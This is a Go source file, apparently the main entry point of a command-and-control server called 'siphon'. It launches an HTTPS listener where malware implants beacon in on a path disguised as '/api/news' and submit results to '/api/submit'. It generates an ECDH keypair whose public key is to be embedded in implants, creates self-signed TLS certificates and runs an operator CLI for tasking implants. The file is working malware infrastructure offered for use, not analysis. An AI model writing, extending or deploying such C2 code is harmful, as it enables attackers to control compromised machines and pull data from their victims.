package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/pem"
	"flag"
	"fmt"
	"math/big"
	"net"
	"os"
	"path/filepath"
	"time"

	"siphon/server"
)

func main() {
	listenAddr := flag.String("listen", ":443", "listen address for the HTTPS C2 server")
	certFile := flag.String("cert", "server/certs/server.crt", "path to TLS certificate")
	keyFile := flag.String("key", "server/certs/server.key", "path to TLS private key")
	serverKeyPath := flag.String("serverkey", "server/certs/server.pem", "path to ECDH server key (PEM)")
	beaconPath := flag.String("beacon-path", "/api/news", "URL path for implant beacon endpoint")
	submitPath := flag.String("submit-path", "/api/submit", "URL path for implant result submission")
	authTokenFlag := flag.String("auth", "", "pre-shared HMAC auth token (must match implant build)")
	genKey := flag.Bool("genkey", false, "generate a new ECDH server keypair, save it, and print the public key hex, then exit")
	genCert := flag.Bool("gencert", false, "generate a self-signed TLS cert+key and write them to -cert/-key paths, then exit")
	flag.Parse()

	if !*genKey && !*genCert && *authTokenFlag == "" {
		fmt.Fprintf(os.Stderr, "[!] WARNING: -auth not set — server has NO authentication.\n")
		fmt.Fprintf(os.Stderr, "    Any network peer can register implants and inject tasks.\n")
	}

	if *genKey {
		if err := os.MkdirAll(filepath.Dir(*serverKeyPath), 0750); err != nil {
			fmt.Fprintf(os.Stderr, "[-] failed to create key directory: %v\n", err)
			os.Exit(1)
		}
		priv, err := server.GenerateServerKeyPair()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] failed to generate keypair: %v\n", err)
			os.Exit(1)
		}
		if err := server.SaveKeyPair(priv, *serverKeyPath); err != nil {
			fmt.Fprintf(os.Stderr, "[-] failed to save keypair to %s: %v\n", *serverKeyPath, err)
			os.Exit(1)
		}
		pubHex := hex.EncodeToString(server.GetPublicKeyBytes(priv))
		fmt.Printf("[+] server key saved to: %s\n", *serverKeyPath)
		fmt.Printf("[+] public key (embed in implant):\n%s\n", pubHex)
		return
	}

	if *genCert {
		if err := generateSelfSignedCert(*certFile, *keyFile); err != nil {
			fmt.Fprintf(os.Stderr, "[-] failed to generate self-signed cert: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[+] TLS cert written to: %s\n", *certFile)
		fmt.Printf("[+] TLS key written to:  %s\n", *keyFile)
		return
	}

	// Normal operation: load server key, create C2Server, start CLI and HTTPS.
	priv, err := server.LoadKeyPair(*serverKeyPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] failed to load server key from %s: %v\n", *serverKeyPath, err)
		fmt.Fprintf(os.Stderr, "    hint: run with -genkey to generate a new keypair\n")
		os.Exit(1)
	}

	c2 := server.NewC2Server(priv, *certFile, *keyFile, *beaconPath, *submitPath, *authTokenFlag)

	// Run the CLI in a goroutine; the HTTPS server blocks on the main goroutine.
	go c2.RunCLI()

	if err := c2.Start(*listenAddr); err != nil {
		fmt.Fprintf(os.Stderr, "[-] server error: %v\n", err)
		os.Exit(1)
	}
}

// generateSelfSignedCert creates a self-signed X.509 certificate valid for one
// year and writes the PEM-encoded cert and key to certPath and keyPath.
// The certificate includes SANs for localhost and 0.0.0.0.
func generateSelfSignedCert(certPath, keyPath string) (err error) {
	if err := os.MkdirAll(filepath.Dir(certPath), 0750); err != nil {
		return fmt.Errorf("mkdir cert dir: %w", err)
	}
	if err := os.MkdirAll(filepath.Dir(keyPath), 0750); err != nil {
		return fmt.Errorf("mkdir key dir: %w", err)
	}

	// Generate P-256 ECDSA key for the TLS certificate.
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return fmt.Errorf("generate TLS key: %w", err)
	}

	// Build serial number.
	serialMax := new(big.Int).Lsh(big.NewInt(1), 128)
	serial, err := rand.Int(rand.Reader, serialMax)
	if err != nil {
		return fmt.Errorf("generate serial: %w", err)
	}

	now := time.Now()
	template := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			Organization: []string{"Internet Widgits Pty Ltd"},
			CommonName:   "localhost",
		},
		NotBefore:             now,
		NotAfter:              now.Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		IPAddresses: []net.IP{
			net.ParseIP("127.0.0.1"),
			net.ParseIP("0.0.0.0"),
		},
		DNSNames: []string{"localhost"},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &priv.PublicKey, priv)
	if err != nil {
		return fmt.Errorf("create certificate: %w", err)
	}

	// Write certificate.
	certOut, err := os.OpenFile(certPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return fmt.Errorf("open cert file: %w", err)
	}
	defer func() {
		if cerr := certOut.Close(); cerr != nil && err == nil {
			err = fmt.Errorf("close cert file: %w", cerr)
		}
	}()
	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: certDER}); err != nil {
		return fmt.Errorf("encode cert: %w", err)
	}

	// Write private key.
	keyOut, err := os.OpenFile(keyPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return fmt.Errorf("open key file: %w", err)
	}
	defer func() {
		if cerr := keyOut.Close(); cerr != nil && err == nil {
			err = fmt.Errorf("close key file: %w", cerr)
		}
	}()
	privDER, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		return fmt.Errorf("marshal key: %w", err)
	}
	if err := pem.Encode(keyOut, &pem.Block{Type: "EC PRIVATE KEY", Bytes: privDER}); err != nil {
		return fmt.Errorf("encode key: %w", err)
	}

	return nil
}
